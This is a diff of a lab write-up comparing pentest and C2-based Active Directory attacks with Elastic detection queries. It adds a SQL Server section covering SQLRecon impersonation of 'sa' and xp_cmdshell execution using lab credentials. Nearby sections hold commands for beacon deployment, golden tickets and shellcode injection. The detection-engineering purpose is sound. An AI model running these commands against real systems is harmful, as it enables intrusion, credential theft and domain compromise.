@@ -7,7 +7,7 @@ lead: "A side-by-side comparison of pentest and C2-based red team approaches to 
 
 > This post maps common Active Directory attack techniques to their red team C2 equivalents and compares the detection footprint of each. Every section shows the pentest command, the C2 command, the OPSEC difference, and the Elastic query to detect the action. The techniques, detection queries, and OPSEC analysis apply to any Active Directory environment. GOAD-Light is the lab used to demonstrate them, not the subject of this post.
 >
-> All C2 commands run from an active Adaptix C2 [Kharon agent](https://github.com/entropy-z/Kharonto) session. All Elastic queries run in Kibana Discover or the KQL bar.
+> All C2 commands run from an active Adaptix C2 [Kharon agent](https://github.com/entropy-z/Kharon) session. All Elastic queries run in Kibana Discover or the KQL bar.
 >
 > **Extension-Kit BOFs referenced:** AD-BOF, Creds-BOF, Elevation-BOF, Execution-BOF, Injection-BOF, LateralMovement-BOF, SAL-BOF, SAR-BOF, Process-BOF, Postex-BOF
 >
@@ -42,7 +42,7 @@ The lab uses GOAD-Light (a multi-domain Active Directory environment with intent
 
 ### 1.1 - Starting Point
 
-This workflow starts from a [Kharon agent](https://github.com/entropy-z/Kharonto) running as `samwell.tarly` on castelblack (SRV02, 10.1.10.22). 
+This workflow starts from a [Kharon agent](https://github.com/entropy-z/Kharon) running as `samwell.tarly` on castelblack (SRV02, 10.1.10.22). 
 
 
 
@@ -97,6 +97,8 @@ No direct detection. Sleep obfuscation is an in-memory technique. The best detec
 ```
 event.module:"endpoint" AND event.action:"Memory Threat Detection Alert"
 ```
+
+---
 
 ---
 
@@ -330,7 +332,7 @@ config ppid 716
 
 ![](image/red-team-workflow/20260921165526.png)
 
-Then run `process create` (this returned no output due to a bug in the [Kharon agent](https://github.com/entropy-z/Kharonto), but you can substitute any command that achieves the same result):
+Then run `process create` (this returned no output due to a bug in the [Kharon agent](https://github.com/entropy-z/Kharon), but you can substitute any command that achieves the same result):
 
 ```
 process create --command "cmd.exe /c net view \\10.1.10.22 /all" --pipe true
@@ -449,6 +451,8 @@ rule.name:"Suspicious Access to LDAP Attributes"
 **Elastic Query - Detect ldapsearch BOF (Option B):**
 
 No prebuilt rule fires. The inline BOF produces zero Sysmon network telemetry on the source host (see Section 2.2 for full analysis). Detection requires DC-side LDAP query auditing (Event ID 1644).
+
+---
 
 ---
 
@@ -794,6 +798,8 @@ The GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` corresponds to `DS-Replication-G
 
 ---
 
+---
+
 ## 4 - Privilege Escalation
 
 ### 4.1 - GPO Abuse (samwell.tarly GenericWrite on STARKWALLPAPER)
@@ -930,9 +936,191 @@ rule.name:"Process Created with an Elevated Token"
 
 ---
 
-## 5 - Lateral Movement
+---
 
-### 5.1 - WinRM (evil-winrm equivalent)
+## 5 - Microsoft SQL Server Exploitation
+
+**MITRE ATT&CK:** T1078 (Valid Accounts), T1505.001 (SQL Stored Procedures)
+
+SQL Server is a common lateral movement and privilege escalation target in Active Directory environments. Impersonation chains (`EXECUTE AS LOGIN`) let a low-privilege domain user escalate to sysadmin without touching LSASS or creating new processes. This section walks through discovery, impersonation, enumeration, and OS command execution from the [Kharon](https://github.com/entropy-z/Kharon) agent using SQLRecon inline through `execute-assembly`.
+
+### 5.1 - Instance Discovery
+
+The SQL Browser service on UDP 1434 returns instance metadata. Start by confirming the instance is reachable.
+
+**Pentest (from Kali):**
+
+```
+nxc mssql 10.1.10.22
+```
+
+**C2 (from castelblack agent):**
+
+The `mssql` BOF queries UDP 1434 directly through ODBC. No child process is created.
+
+```
+mssql 1434udp 10.1.10.22
+```
+
+![MSSQL 1434 UDP discovery](writeups/images/red-team-workflow/20260923160529.png)
+
+The response shows the instance name, version, and TCP port. The SQL Browser service must be running for this query to work.
+
+### 5.2 - Server Information
+
+**Pentest (from Kali via SOCKS proxy):**
+
+```
+proxychains mssqlclient.py north.sevenkingdoms.local/samwell.tarly:Heartsbane@10.1.10.22 -windows-auth
+```
+
+**C2 (SQLRecon via execute-assembly):**
+
+SQLRecon runs inline through `execute-assembly`. It loads the .NET CLR into the beacon process and connects with Windows domain authentication. No binary is written to disk.
+
+```
+execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:info
+```
+
+![SQLRecon info module](writeups/images/red-team-workflow/20260923160725.png)
+
+### 5.3 - Current User Context
+
+The `whoami` module shows the mapped user, permissions, and role memberships.
+
+**C2 Command:**
+
+```
+execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:whoami
+```
+
+![SQLRecon whoami](writeups/images/red-team-workflow/20260923161001.png)
+
+samwell.tarly maps to the `guest` user with `CONNECT SQL` and `VIEW ANY DATABASE` permissions. No sysadmin role. Direct enumeration of tables or command execution is not possible with these permissions.
+
+### 5.4 - Impersonation Enumeration
+
+SQL Server supports `EXECUTE AS LOGIN`, which lets one login act as another. The `impersonate` module lists accounts that the current user can impersonate.
+
+**C2 Command (samwell.tarly):**
+
+```
+execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:impersonate
+```
+
+![SQLRecon impersonate as samwell.tarly](writeups/images/red-team-workflow/20260923161210.png)
+
+samwell.tarly can impersonate `sa` (sysadmin).
+
+**C2 Command (jon.snow):**
+
+```
+execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:jon.snow /password:iknownothing /module:impersonate
+```
+
+![SQLRecon impersonate as jon.snow](writeups/images/red-team-workflow/20260923162311.png)
+
+jon.snow has a broader impersonation chain. Any domain account with `EXECUTE AS LOGIN` permissions becomes a pivot point into SQL Server sysadmin. An attacker who compromises credentials for any of these users (through Kerberoasting, LSASS dumps, or NETLOGON scripts) can escalate to `sa` without any exploit.
+
+### 5.5 - Database and User Enumeration (as sa)
+
+With `sa` impersonation confirmed, all subsequent commands use `/i:sa` to operate with sysadmin privileges.
+
+**C2 Command (databases):**
+
+```
+execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:databases /i:sa
+```
+
+![SQLRecon databases](writeups/images/red-team-workflow/20260923161237.png)
+
+**C2 Command (users):**
+
+```
+execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:users /i:sa
+```
+
+![SQLRecon users](writeups/images/red-team-workflow/20260923161326.png)
+
+### 5.6 - Linked Server Enumeration (as sa)
+
+Linked servers store credentials for cross-server queries. In environments with multiple SQL instances, linked server credentials are a lateral movement path to other domains or forests.
+
+**C2 Command:**
+
+```
+execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:links /i:sa
+```
+
+![SQLRecon links](writeups/images/red-team-workflow/20260923161452.png)
+
+### 5.7 - OS Command Execution via xp_cmdshell (as sa)
+
+`xp_cmdshell` runs operating system commands through SQL Server. It is disabled by default. With sysadmin privileges (through `sa` impersonation), enable it and execute commands.
+
+**Pentest (mssqlclient.py via SOCKS proxy):**
+
+```
+proxychains mssqlclient.py north.sevenkingdoms.local/samwell.tarly:Heartsbane@10.1.10.22 -windows-auth
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
+**C2 (SQLRecon via execute-assembly):**
+
+```
+execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:enablexp /i:sa
+```
+
+![SQLRecon enable xp_cmdshell](writeups/images/red-team-workflow/20260923161523.png)
+
+```
+execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:xpcmd /i:sa /c:whoami
+```
+
+![SQLRecon xpcmd whoami](writeups/images/red-team-workflow/20260923161545.png)
+
+The command runs as `north\sql_svc`. This is the SQL Server service account. From here, the attacker can write files, add users, or deploy a new beacon through the SQL service context.
+
+**OPSEC Comparison:**
+
+| Factor | Pentest (mssqlclient.py) | Red Team (SQLRecon via execute-assembly) |
+|--------|--------------------------|------------------------------------------|
+| Tool on disk | None (runs from Kali) | None (inline .NET CLR load) |
+| Process creation | N/A | No child process. CLR loads into beacon |
+| Network | TCP 1433 from Kali IP | TCP 1433 from internal domain host |
+| Persistence | mssqlclient.py session | mssql BOF uses ODBC directly |
+| Detection | Anomalous external SQL connection | Standard internal SQL traffic |
+
+**OPSEC Notes:**
+
+- SQLRecon runs inline through `execute-assembly`. The .NET CLR loads into the beacon process. No child process is created and no binary is written to disk.
+- The `mssql` BOF uses ODBC to connect directly. It generates network traffic on TCP 1433 but no process creation events.
+- Elastic does not have a prebuilt rule for SQL Server impersonation or `xp_cmdshell` enablement. Detection requires custom rules that monitor SQL Server audit logs or Windows Security Event 4688 for processes spawned by `sqlservr.exe`.
+
+**Elastic Query - Detect xp_cmdshell Execution:**
+
+No prebuilt rule fires. Detect `xp_cmdshell` by looking for child processes of `sqlservr.exe`. This catches any OS command run through SQL Server, regardless of the tool used to trigger it.
+
+```
+process.parent.name:"sqlservr.exe" AND NOT process.name:("sqlwriter.exe" OR "sqlceip.exe" OR "sqlagent.exe")
+```
+
+![Elastic detection of xp_cmdshell child process](writeups/images/red-team-workflow/20260923164717.png)
+
+**Elastic Query - Detect SQL Server Configuration Change:**
+
+Detect `sp_configure` calls that enable `xp_cmdshell` or `Ole Automation Procedures`. Requires SQL Server audit logging to be enabled and forwarded to Elastic. This is not configured by default.
+
+```
+event.provider:"MSSQLSERVER" AND winlog.event_data.TextData:("xp_cmdshell" OR "Ole Automation Procedures" OR "show advanced options")
+```
+
+---
+
+## 6 - Lateral Movement
+
+### 6.1 - WinRM (evil-winrm equivalent)
 
 **MITRE ATT&CK:** T1021.006 (Remote Services: Windows Remote Management)
 
@@ -1000,7 +1188,7 @@ rule.name:"Incoming Execution via PowerShell Remoting"
 
 ---
 
-### 5.2 - PsExec (Service-based Lateral Movement)
+### 6.2 - PsExec (Service-based Lateral Movement)
 
 **MITRE ATT&CK:** T1021.002 (Remote Services: SMB/Windows Admin Shares), T1569.002 (System Services: Service Execution)
 
@@ -1028,7 +1216,7 @@ Create custom service name and binary name to reduce signature:
 jump psexec -b svcutil.exe -n "WinConfigSvc" -d "Manages system configuration updates" 10.1.10.11 /local/path/to/smb_x64_svc.exe
 ```
 
-> The SMB beacon would have been the best and realistic option for this, however Kharon Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
+> The SMB beacon would have been the best and realistic option for this, however [Kharon](https://github.com/entropy-z/Kharon) Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
 
 ![](image/red-team-workflow/20260922165526.png)
 
@@ -1084,11 +1272,11 @@ event.code:"17" AND winlog.event_data.PipeName:*svcctl*
 
 ---
 
-### 5.3 - SCShell (Service Binary Path Modification, Recommended)
+### 6.3 - SCShell (Service Binary Path Modification, Recommended)
 
 **MITRE ATT&CK:** T1569.002 (System Services: Service Execution), T1543.003 (Create or Modify System Process: Windows Service)
 
-> This approach was not followed due to a bug in the [Kharon agent](https://github.com/entropy-z/Kharonto).
+> This approach was not followed due to a bug in the [Kharon agent](https://github.com/entropy-z/Kharon).
 
 SCShell modifies an existing service binary path instead of creating a new service. This avoids Event ID 7045 (new service creation).
 
@@ -1112,7 +1300,7 @@ With a specific service name and custom binary name:
 jump scshell 10.1.10.11 /local/path/to/smb_x64_svc.exe -n defragsvc -b update.exe -s C$ -p C:\Windows
 ```
 
-> The SMB beacon would have been the best and realistic option for this, however Kharon Listener config doesn't yet support SMB as previously explained in section 5.2. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
+> The SMB beacon would have been the best and realistic option for this, however [Kharon](https://github.com/entropy-z/Kharon) Listener config doesn't yet support SMB as previously explained in section 6.2. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
 
 ![](image/red-team-workflow/20260922165815.png)
 
@@ -1169,7 +1357,7 @@ event.code:"7036" AND winlog.event_data.param1:("SensorService" OR "defragsvc" O
 
 ---
 
-### 5.4 - RDP (Interactive Desktop Access)
+### 6.4 - RDP (Interactive Desktop Access)
 
 **MITRE ATT&CK:** T1021.001 (Remote Services: Remote Desktop Protocol)
 
@@ -1209,9 +1397,11 @@ event.code:"4624" AND winlog.event_data.LogonType:"10"
 
 ---
 
-## 6 - Domain Escalation
+---
 
-### 6.1 - Constrained Delegation Abuse (jon.snow)
+## 7 - Domain Escalation
+
+### 7.1 - Constrained Delegation Abuse (jon.snow)
 
 **MITRE ATT&CK:** T1550.003 (Use Alternate Authentication Material: Pass the Ticket), T1558 (Steal or Forge Kerberos Tickets)
 
@@ -1312,7 +1502,7 @@ event.code:"4769" AND winlog.event_data.TransmittedServices:*
 
 ---
 
-### 6.2 - ExtraSids / Golden Ticket (Child-to-Parent Domain)
+### 7.2 - ExtraSids / Golden Ticket (Child-to-Parent Domain)
 
 **MITRE ATT&CK:** T1558.001 (Steal or Forge Kerberos Tickets: Golden Ticket)
 
@@ -1331,7 +1521,7 @@ secretsdump.py -k -no-pass 'north.sevenkingdoms.local/Administrator@kingslanding
 
 **C2 Command (from winterfell agent after lateral movement, running as SYSTEM):**
 
-After moving laterally to winterfell (DC02) and escalating to SYSTEM (see Section 5), extract the krbtgt hash. Since you have SYSTEM on DC02, use lsadump (no DCSync replication traffic):
+After moving laterally to winterfell (DC02) and escalating to SYSTEM (see Section 6), extract the krbtgt hash. Since you have SYSTEM on DC02, use lsadump (no DCSync replication traffic):
 
 ```
 lsadump_secrets
@@ -1380,7 +1570,7 @@ ticketConverter.py Administrator.ccache Administrator.kirbi
 base64 -w 0 Administrator.kirbi
 ```
 
-Back in the [Kharon agent](https://github.com/entropy-z/Kharonto):
+Back in the [Kharon agent](https://github.com/entropy-z/Kharon):
 
 ```
 kerbeus ptt /ticket:<base64_kirbi>
@@ -1402,7 +1592,7 @@ upload /local/path/to/http_x64.exe \\kingslanding.sevenkingdoms.local\ADMIN$\htt
 
 ![](image/red-team-workflow/20260922160121.png)
 
-> The SMB beacon would have been the best and realistic option for this, however Kharon Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run link smb <target_ip> <pipe_name> right after the command below to connect to the SMB beacon.
+> The SMB beacon would have been the best and realistic option for this, however [Kharon](https://github.com/entropy-z/Kharon) Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run link smb <target_ip> <pipe_name> right after the command below to connect to the SMB beacon.
 
 
 ```
@@ -1449,9 +1639,9 @@ event.code:"4769" AND winlog.event_data.ServiceName:"krbtgt"
 
 ---
 
-## 7 - Post-Exploitation
+## 8 - Post-Exploitation
 
-### 7.1 - File Operations
+### 8.1 - File Operations
 
 **MITRE ATT&CK:** T1039 (Data from Network Shared Drive)
 
@@ -1496,7 +1686,7 @@ No specific detection for file reads through SMB from an authenticated domain us
 
 ---
 
-### 7.2 - NETLOGON Script Discovery
+### 8.2 - NETLOGON Script Discovery
 
 **MITRE ATT&CK:** T1552.001 (Unsecured Credentials: Credentials in Files)
 
@@ -1526,7 +1716,7 @@ event.code:"5145" AND winlog.event_data.ShareName:*NETLOGON*
 
 ---
 
-### 7.3 - Situational Awareness
+### 8.3 - Situational Awareness
 
 **MITRE ATT&CK:** T1033 (System Owner/User Discovery), T1016 (System Network Configuration Discovery), T1082 (System Information Discovery)
 
@@ -1602,13 +1792,13 @@ These rules detect `net.exe` or `whoami.exe` process creation. BOF-based equival
 
 ---
 
-## 8 - Shellcode Injection (for New Beacon Deployment)
+## 9 - Shellcode Injection (for New Beacon Deployment)
 
-### 8.1 - CreateRemoteThread (Built-in Kharon Method)
+### 9.1 - CreateRemoteThread (Built-in [Kharon](https://github.com/entropy-z/Kharon) Method)
 
 **MITRE ATT&CK:** T1055 (Process Injection)
 
-The Kharon `scinject` command and `kit_explicit_inject.cc` use VirtualAllocEx + WriteProcessMemory + VirtualProtectEx + CreateRemoteThread.
+The [Kharon](https://github.com/entropy-z/Kharon) `scinject` command and `kit_explicit_inject.cc` use VirtualAllocEx + WriteProcessMemory + VirtualProtectEx + CreateRemoteThread.
 
 **C2 Command:**
 
@@ -1658,7 +1848,7 @@ event.code:"8" AND NOT winlog.event_data.SourceImage:(*csrss.exe* OR *wininit.ex
 
 ---
 
-### 8.2 - Extension-Kit Injection BOFs
+### 9.2 - Extension-Kit Injection BOFs
 
 **MITRE ATT&CK:** T1055 (Process Injection)
 
@@ -1694,9 +1884,9 @@ Any remote process injection that creates a thread in another process can trigge
 
 ---
 
-## 9 - Detection Coverage Summary
+## 10 - Detection Coverage Summary
 
-### 9.1 - Prebuilt Elastic Rules That Fire per Attack Phase
+### 10.1 - Prebuilt Elastic Rules That Fire per Attack Phase
 
 | Attack Phase | Pentest Method | Red Team C2 Method | Prebuilt Rules That Fire |
 |-------------|----------------|-------------------|------------------------|
@@ -1715,25 +1905,29 @@ Any remote process injection that creates a thread in another process can trigge
 | Golden Ticket | ticketer.py | execute-assembly Rubeus golden | KRBTGT Delegation Backdoor |
 | Injection (CRT) | N/A | scinject | Process Injection - Detected, Sysmon Event 8 |
 | Injection (PoolParty) | N/A | inject-poolparty | None |
-| Injection (Section) | N/A | inject-sec | Sysmon Event 8 (remote thread creation, see Section 8.2) |
+| Injection (Section) | N/A | inject-sec | Sysmon Event 8 (remote thread creation, see Section 9.2) |
 | Discovery | whoami, net, ipconfig | SAL BOFs | Pentest: Account/Group Discovery. Red Team: None |
+| MSSQL Discovery | nxc mssql | mssql 1434udp BOF | None |
+| MSSQL Impersonate + xpcmd | mssqlclient.py | execute-assembly SQLRecon | None (custom rule required) |
 
-### 9.2 - Detection Gaps (No Prebuilt Rule Fires)
+### 10.2 - Detection Gaps (No Prebuilt Rule Fires)
 
 These C2 actions have no prebuilt Elastic detection in the current 152-rule set:
 
 1. **AS-REP Roasting** - Requires custom rule on Event 4768 with PreAuthType 0
 2. **Kerberoasting** - Requires custom rule on Event 4769 with EncryptionType 0x17
 3. **SCShell lateral movement** - Requires custom rule on registry ImagePath modification (Event 13)
-4. **inject-sec (section mapping)** - NtCreateSection and NtMapViewOfSection generate no Sysmon events, but the remote thread creation still triggers Event ID 8 (see Section 8.2)
+4. **inject-sec (section mapping)** - NtCreateSection and NtMapViewOfSection generate no Sysmon events, but the remote thread creation still triggers Event ID 8 (see Section 9.2)
 5. **inject-poolparty (thread pool abuse)** - No Sysmon event generated for thread pool item insertion
 6. **inject-cfg (CFG hijacking)** - No Sysmon event generated for COM pointer overwrite
 7. **BOF-based discovery** (whoami, ipconfig, arp, etc.) - No child process created, no Event ID 1
 8. **ADWS enumeration** (adwssearch BOF) - Different protocol (TCP 9389) than monitored LDAP (TCP 389)
 9. **nanodump with spoofed callstack** (-sc flag) - Spoofed callstack evades Sysmon Event 10 CallTrace field checks
 10. **Sleep obfuscation / heap masking** - In-memory technique, no event generated
+11. **SQL Server impersonation (EXECUTE AS LOGIN)** - No host-level event, requires SQL Server audit logging
+12. **xp_cmdshell enablement via sp_configure** - No prebuilt rule, requires SQL Server audit or Windows Event 4688 for child processes of sqlservr.exe
 
-### 9.3 - Custom Detection Rules to Close Gaps
+### 10.3 - Custom Detection Rules to Close Gaps
 
 **Custom Rule 1 - AS-REP Roasting:**
 
@@ -1775,13 +1969,23 @@ Severity: Low
 MITRE: T1069
 ```
 
+**Custom Rule 5 - Process Spawned by SQL Server (xp_cmdshell):**
+
+```
+Name: Child Process of SQL Server (Potential xp_cmdshell)
+Index: logs-endpoint.events.process-*
+KQL: process.parent.name:"sqlservr.exe" AND NOT process.name:("sqlwriter.exe" OR "sqlceip.exe" OR "sqlagent.exe")
+Severity: High
+MITRE: T1505.001
+```
+
 ---
 
-## 10 - Full Attack Chain Mapping
+## 11 - Full Attack Chain Mapping
 
-### 10.1 - Path A
+### 11.1 - Path A
 
-Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharonto) on castelblack (SRV02) as samwell.tarly.
+Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharon) on castelblack (SRV02) as samwell.tarly.
 
 | Step | Phase | C2 Action | Pentest Equivalent | Detection |
 |------|-------|-----------|-------------------|-----------|
@@ -1801,32 +2005,32 @@ Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharon
 | 14 | Domain | `execute-assembly Rubeus.exe golden /sids:...-519` | `ticketer.py -extra-sid ...-519` | KRBTGT Delegation rule |
 | 15 | Domain | `jump scshell kingslanding http_x64.exe` | `secretsdump.py -k kingslanding` | No rule (SCShell) |
 
-### 10.2 - Path B
+### 11.2 - Path B
 
-Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharonto) on castelblack (SRV02) as samwell.tarly.
+Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharon) on castelblack (SRV02) as samwell.tarly.
 
 | Step | Phase | C2 Action | Pentest Equivalent | Detection |
 |------|-------|-----------|-------------------|-----------|
-| 1 | Recon | `smartscan 10.1.10.0/24 -p 445` | `nxc smb 10.1.10.0/24` | Network Scan rule |
+| 1 | Recon | `smartscan -p 445` | `nxc smb 10.1.10.0/24` | Network Scan rule |
 | 2 | Recon | `process create "net view \\SRV02 /all"` | `smbclient -N -L //SRV02` | Windows Network Enumeration |
-| 3 | Recon | `ldapsearch (objectClass=user) -a sAMAccountName,description` | `nxc smb DC02 --users` | LDAP Attributes rule |
+| 3 | Recon | `ldapsearch (objectClass=user)` | `nxc smb DC02 --users` | LDAP Attributes rule |
 | 4 | Recon | `fs ls C:\Shares\all` | `nxc smb SRV02 --shares` | None |
 | 5 | Recon | `fs cat C:\Shares\all\arya.txt` | `smbclient get arya.txt` | None |
-| 6 | Creds | `kerbeus asreproasting /user:brandon.stark` | `GetNPUsers brandon.stark` | Custom rule needed |
+| 6 | Creds | `kerbeus asreproasting` | `GetNPUsers brandon.stark` | Custom rule needed |
 | 7 | Creds | Offline: `hashcat -m 18200` | Same | N/A |
-| 8 | Creds | `kerbeus asktgt` then `kerbeus kerberoasting` | `Rubeus.exe kerberoast` (on disk) | Custom rule needed |
-| 9 | Creds | Offline: `hashcat -m 13100` (jon.snow cracked) | Same | N/A |
-| 10 | Recon | `fs cat \\winterfell\NETLOGON\script.ps1` (jeor.mormont creds) | `smbclient //NETLOGON get script.ps1` | None |
-| 11 | PrivEsc | `token make` as jeor.mormont (local admin) | `nxc smb jeor.mormont (Pwn3d!)` | None |
-| 12 | PrivEsc | `getsystem token` (SYSTEM via jeor.mormont) | N/A | Privilege Escalation rules |
-| 13 | Creds | `nanodump -sc --valid` (as SYSTEM) | `mimikatz logonpasswords` (on disk) | Pentest: 5+ rules. C2: 0-1 |
-| 14 | Recon | `execute-assembly SharpHound.exe --Throttle 3000` | `SharpHound.exe` (on disk) | Enumeration rules |
-| 15 | Creds | Offline: `hashcat -m 1000` (robb.stark cracked) | Same | N/A |
-| 16 | Lateral | `jump scshell winterfell http_x64.exe` (robb.stark token) | `evil-winrm -i DC02` | No rule (SCShell) |
-| 17 | PrivEsc | `getsystem token` (on winterfell) | N/A | Privilege Escalation rules |
+| 8 | Creds | `kerbeus asktgt` + `kerberoasting` | `Rubeus.exe kerberoast` | Custom rule needed |
+| 9 | Creds | Offline: `hashcat -m 13100` (jon.snow) | Same | N/A |
+| 10 | Recon | `fs cat \\winterfell\NETLOGON\script.ps1` | `smbclient //NETLOGON get` | None |
+| 11 | PrivEsc | `token make` (jeor.mormont) | `nxc smb jeor.mormont` | None |
+| 12 | PrivEsc | `getsystem token` | N/A | Privilege Escalation rules |
+| 13 | Creds | `nanodump -sc --valid` | `mimikatz logonpasswords` | Pentest: 5+ rules. C2: 0-1 |
+| 14 | Recon | `execute-assembly SharpHound.exe` | `SharpHound.exe` (on disk) | Enumeration rules |
+| 15 | Creds | Offline: `hashcat -m 1000` (robb.stark) | Same | N/A |
+| 16 | Lateral | `jump scshell winterfell` (robb.stark) | `evil-winrm -i DC02` | No rule (SCShell) |
+| 17 | PrivEsc | `getsystem token` (winterfell) | N/A | Privilege Escalation rules |
 | 18 | Creds | `lsadump_secrets` (SYSTEM on DC02) | `secretsdump.py robb.stark@DC02` | Registry Hive rule |
-| 19 | Domain | `execute-assembly Rubeus.exe golden /sids:...-519` | `lookupsid.py + ticketer.py` | KRBTGT Delegation rule |
-| 20 | Domain | `jump scshell kingslanding http_x64.exe` | `secretsdump.py -k kingslanding` | No rule (SCShell) |
+| 19 | Domain | `execute-assembly Rubeus.exe golden` | `lookupsid.py + ticketer.py` | KRBTGT Delegation rule |
+| 20 | Domain | `jump scshell kingslanding` | `secretsdump.py -k kingslanding` | No rule (SCShell) |
 
 ---
 
@@ -1896,7 +2100,7 @@ Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharon
 
 | Command | Syntax | Purpose |
 |---------|--------|---------|
-| `scinject` | `scinject <pid> <shellcode_file>` | CRT injection (built-in Kharon) |
+| `scinject` | `scinject <pid> <shellcode_file>` | CRT injection (built-in [Kharon](https://github.com/entropy-z/Kharon)) |
 | `inject-cfg` | `inject-cfg <pid> <shellcode_file>` | CFG pointer hijack |
 | `inject-sec` | `inject-sec <pid> <shellcode_file>` | Section mapping |
 | `inject-poolparty` | `inject-poolparty <technique_id> <pid> <shellcode_file>` | Thread pool abuse (8 variants) |
@@ -1949,7 +2153,7 @@ Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharon
 | `quser` | `quser [host]` | Query user sessions (BOF) |
 | `taskhound` | `taskhound <target> [user] [pass] [-save dir]` | Scheduled task enum (BOF) |
 
-### Kharon Built-in Commands
+### [Kharon](https://github.com/entropy-z/Kharon) Built-in Commands
 
 | Command | Syntax | Purpose |
 |---------|--------|---------|
@@ -2019,7 +2223,7 @@ Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharon
 
 ## Key Findings
 
-This exercise ran the same Active Directory attack chain twice against the same lab: once as a traditional pentest from Kali, and once through a C2 framework (Adaptix/Kharon) from a compromised domain-joined host. Both paths achieved full domain compromise (castelblack to winterfell to kingslanding). The detection results are different.
+This exercise ran the same Active Directory attack chain twice against the same lab: once as a traditional pentest from Kali, and once through a C2 framework (Adaptix/[Kharon](https://github.com/entropy-z/Kharon)) from a compromised domain-joined host. Both paths achieved full domain compromise (castelblack to winterfell to kingslanding). The detection results are different.
 
 **Detection coverage comparison:**
 
@@ -2046,6 +2250,6 @@ This exercise ran the same Active Directory attack chain twice against the same 
 3. **Shellcode injection (CRT and section mapping).** Sysmon Event ID 8 fires for any remote thread creation, including inject-sec. Indirect syscalls do not bypass the kernel callback that Sysmon hooks.
 4. **Kerberos ticket operations.** Event IDs 4768 and 4769 are logged on the DC regardless of source. The events exist in raw logs. The gap is that no prebuilt Elastic rule fires on them.
 
-**The real gap is not technique visibility. It is rule coverage.** The raw telemetry for most C2 actions exists somewhere in the logs. Kerberoasting produces Event 4769. AS-REP roasting produces Event 4768. SCShell produces Event 13 (registry modification). The problem is that Elastic's prebuilt rule set (152 rules in this deployment) does not include rules for these events. Section 9.3 provides four custom rules that close the most critical gaps.
+**The real gap is not technique visibility. It is rule coverage.** The raw telemetry for most C2 actions exists somewhere in the logs. Kerberoasting produces Event 4769. AS-REP roasting produces Event 4768. SCShell produces Event 13 (registry modification). The problem is that Elastic's prebuilt rule set (152 rules in this deployment) does not include rules for these events. Section 10.3 provides five custom rules that close the most critical gaps.
 
 **Bottom line:** A pentest from Kali tests whether your detections work at all. A C2-based red team test shows whether they work when the attacker operates from inside your network, avoids child processes, uses Kerberos authentication, and stays in memory. Both are necessary. Running only one gives a false picture of your detection posture.
